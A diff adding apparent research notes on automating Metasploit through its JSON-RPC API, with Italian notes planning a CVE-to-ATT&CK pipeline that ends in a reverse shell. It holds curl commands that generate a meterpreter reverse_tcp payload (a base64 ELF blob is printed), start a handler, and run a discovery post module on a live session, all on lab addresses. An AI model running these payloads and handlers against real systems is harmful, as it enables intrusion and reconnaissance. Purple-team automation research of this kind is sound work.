@@ -1,0 +1,95 @@
+Useful Findings when starting msfrpcd with -j flag option to use JSON-RPC
+The error is not related to the msf_db init
+After creating the key and cert for the SSL
+openssl req -newkey rsa:2048 -nodes -keyout msf-ws-key.pem -x509 -days 365 -out msf-ws-cert.pem
+Mount cert and key as volume of type bind
+./msfrpcd -j -U 123 -P 123 -f
+TEST API
+curl -kv  --tls-max 1.1 -X POST -U 123 -H "Content-Type: application/json" -d '{"jsonrpc": "2.0", "method": "core.version", "id": 1 }' https://127.0.0.1:55553/api/v1/json-rpc
+LOGIN API (require a user stored in database)
+curl -kv -X POST -U 123 -H "Content-Type: application/json" -d '{"jsonrpc": "2.0", "method": "auth.login", "id": 1 ,"params":["user","password"]}' https://127.0.0.1:55553/api/v1/json-rpc 
+LIST MODULES
+curl -kv -X POST -U 123 -H "Content-Type: application/json" -d '{"jsonrpc": "2.0", "method": "module.payloads", "id": 1 }' https://127.0.0.1:55553/api/v1/json-rpc
+MODULE INFO
+curl -kv -X POST -U 123 -H "Content-Type: application/json" -d '{"jsonrpc": "2.0", "method": "module.info", "id": 1 , "params":["exploit","windows/smb/ms08_067_netapi"]}' https://127.0.0.1:55553/api/v1/json-rpc
+MODULE EXECUTE (generate payload)
+curl -kv -X POST -U 123 -H "Content-Type: application/json" https://127.0.0.1:55553/api/v1/json-rpc -d '{"jsonrpc": "2.0", "method": "module.execute", "id": 1 , "params":["payload","linux/x86/meterpreter/reverse_tcp_uuid",{"LHOST":"127.0.0.1", "LPORT": 4444, "Format": "elf", "PayloadUUIDTracking":true,"PayloadUUIDName":"e67fb4c8-8c3f-11ea-be40-00155d6f625f"}]}'
+Response
+{
+    "id": 1,
+    "jsonrpc": "2.0",
+    "result": {
+        "payload": "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAj6AAAAoAEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1tofwAAAWgCABFcieFqZlhQUVeJ4UPNgIXAeUROdGhoogAAAFhqAGoFieMxyc2AhcB5vetSU1FqAGoQ6BAAAAAHlzxAwfLEwQg5DjhWlB8eV4nhaglbamZYzYCDxBBZW7IHuQAQAACJ48HrDMHjDLB9zYCFwHgQW4nhmbJqsAPNgIXAeAL/4bgBAAAAuwEAAADNgA=="
+    }
+}
+curl -k -X POST -U 123 -H "Content-Type: application/json" https://127.0.0.1:55553/api/v1/json-rpc -d '{"jsonrpc": "2.0", "method": "module.execute", "id": 1 , "params":["payload","linux/x86/meterpreter_reverse_tcp",{"LHOST":"127.0.0.1", "LPORT": 4444, "Format": "elf", "PayloadUUIDTracking":true,"PayloadUUIDName":"e67fb4c8-8c3f-11ea-be40-00155d6f625f"}]}'| python -c "import sys, json; print(json.load(sys.stdin)['result']['payload'])"
+
+From msfconsole
+msf5 > use exploit/multi/handler 
+set payload linux/x86/meterpreter_reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+run
+
+from meterpreter shell
+run post/linux/purple/t1016
+
+https://rapid7.github.io/metasploit-framework/api/Msf/RPC/RPC_Module.html#rpc_execute-instance_method
+# Starts a windows/meterpreter/reverse_tcp on port 6669
+opts = {'LHOST' => '0.0.0.0', 'LPORT'=>6669, 'PAYLOAD'=>'windows/meterpreter/reverse_tcp'}
+rpc.call('module.execute', 'exploit', 'multi/handler', opts)
+
+curl -k -X POST -U 123 -H "Content-Type: application/json" https://127.0.0.1:55553/api/v1/json-rpc -d '{"jsonrpc": "2.0", "method": "module.execute", "id": 1 , "params":["exploit","multi/handler",{"LHOST":"0.0.0.0", "LPORT": 4444, "PAYLOAD":"linux/x86/meterpreter_reverse_tcp"}]}'
+
+curl -k -X POST -U 123 -H "Content-Type: application/json" https://127.0.0.1:55553/api/v1/json-rpc -d '{"jsonrpc": "2.0", "method": "job.list", "id": 1 }'
+{"jsonrpc":"2.0","result":{"1":"Exploit: multi/handler"},"id":1}
+
+curl -k -X POST -U 123 -H "Content-Type: applicati
+on/json" https://127.0.0.1:55553/api/v1/json-rpc -d '{"jsonrpc": "2.0", "method": "session.list", "id": 1 }'
+
+{"jsonrpc":"2.0","result":{"1":{"type":"meterpreter","tunnel_local":"172.19.0.3:4444","tunnel_peer":"172.19.0.1:39710"
+,"via_exploit":"exploit/multi/handler","via_payload":"payload/linux/x86/meterpreter_reverse_tcp","desc":"Meterpreter",
+"info":"uid=1000, gid=1000, euid=1000, egid=1000 @ DESKTOP-FAR1JSL.localdomain","workspace":"false","session_host":"17
+2.28.134.144","session_port":39710,"target_host":"","username":"unknown","uuid":"h5nzlcpe","exploit_uuid":"zwm8kgyc","
+routes":"","arch":"x86","platform":"linux"}},"id":1}
+
+
+curl -k -X POST -U 123 -H "Content-Type: application/json" https://127.0.0.1:55553/api/v1/json-rpc \
+-d '{"id":1, "jsonrpc": "2.0", "method": "session.meterpreter_run_single", "params": [1,"run post/linux/purple/t1016"]}'
+
+curl -k -X POST -U 123 -H "Content-Type: application/json" https://127.0.0.1:55553/api/v1/json-rpc \
+-d '{"id":1, "jsonrpc": "2.0", "method": "session.meterpreter_read", "params": [1]}'
+
+{
+    "id": 1,
+    "jsonrpc": "2.0",
+    "result": {
+        "data": "[*] Executing command /sbin/ifconfig -a...\n[+] bond0: flags=5122<BROADCAST,MASTER,MU
+LTICAST>  mtu 1500\n        ether 62:02:48:d0:8f:de  txqueuelen 1000  (Ethernet)\n        RX packets 0
+  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 
+(0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\ndummy0: flags=130<BROADCAST,NOARP>  mtu 1500\n        ether be:35:2e:98:69:8d  txqueuelen 1000  (Ethernet)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 172.28.134.144  netmask 255.255.240.0  broadcast 172.28.143.255\n        inet6 fe80::215:5dff:fe6f:625f  prefixlen 64  scopeid 0x20<link>\n        ether 00:15:5d:6f:62:5f  txqueuelen 1000  (Ethernet)\n        RX packets 555212  bytes 202045164 (202.0 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 351411  bytes 276732461 (276.7 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 272122  bytes 43690883 (43.6 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 272122  bytes 43690883 (43.6 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nsit0: flags=128<NOARP>  mtu 1480\n        sit  txqueuelen 1000  (IPv6-in-IPv4)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n[*] Executing command /usr/sbin/arp -a...\n[+] DESKTOP-FAR1JSL (172.28.128.1) at 00:15:5d:25:32:db [ether] on eth0\n[*] Executing command /sbin/iwconfig...\n[+] /bin/sh: 1: /sbin/iwconfig: not found\n[*] Executing command /sbin/route...\n[+] Kernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\ndefault         DESKTOP-FAR1JSL 0.0.0.0         UG    0      0        0 eth0\n172.28.128.0    0.0.0.0         255.255.240.0   U     0      0        0 eth0\n"
+    }
+}
+
+trovare tutte tecniche per una specifica tattica es. discovery
+#query elasticsearch ritorna STIX avente modulo metasploit da eseguire, e moduli post da eseguire
+#tramite API invoco modulo per payload
+#ottengo reverse shell
+#tramite API invoco moduli post
+
++++++++Test di validazione della consistenza cve->cwe->capec->att&ck++++++
+Scanning nmap ritorna CVE, 2 path disponibili
+- input CVEs, query ritorna tactics, provo ad eseguire tactics es. se XSS 0 tactics
+- potrei avere una RCE, si potrebbe ottenere meterpreter shell, dopo aver ottenuto meterpreter shell
+nuovo scanning CVE
+msfconsole search CVE per ottenere payload (semiautomatico) vd monkeyinfection 
+input CVEs, query ritorna nuove tactics
+
+caso0: happy path
+caso1: broken link
+caso2: wrong link
+
+statistiche sulla correttezza
+moduli post eseguibili in un tempo accettabile sul numero totale di tattiche
+nessun modulo post eseguibile
+moduli post eseguibili vs non eseguibili tra quelli trovate
